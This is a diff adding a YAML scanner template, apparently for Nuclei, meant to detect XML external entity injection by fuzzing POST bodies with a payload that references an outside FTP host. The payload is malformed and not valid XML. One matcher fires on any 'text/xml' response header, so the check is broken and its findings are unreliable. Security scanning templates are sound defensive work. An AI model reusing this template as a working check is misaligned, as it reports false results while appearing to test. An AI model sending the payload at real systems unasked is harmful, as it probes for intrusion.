@@ -1,0 +1,39 @@
+id: fuzz-xxe-custom
+
+info:
+  name: Custom XXE Injection Detection
+  author: netbaan
+  severity: medium
+  description: |
+    This template is designed to detect XXE vulnerabilities using a specified payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "POST"'  # Adjust this to the appropriate HTTP method if necessary
+
+    payloads:
+      xxe:
+        - "<!DOCxxe :_-_: SYSTEM \"ftp://x.s.artsploit.com/\">"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: body
+        type: replace
+        mode: single
+        fuzz:
+          - "{{xxe}}"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "x.s.artsploit.com"   # Adjust based on expected response
+
+      - type: word
+        part: header
+        words:
+          - "text/xml"   # Adjust this based on expected content type if necessary
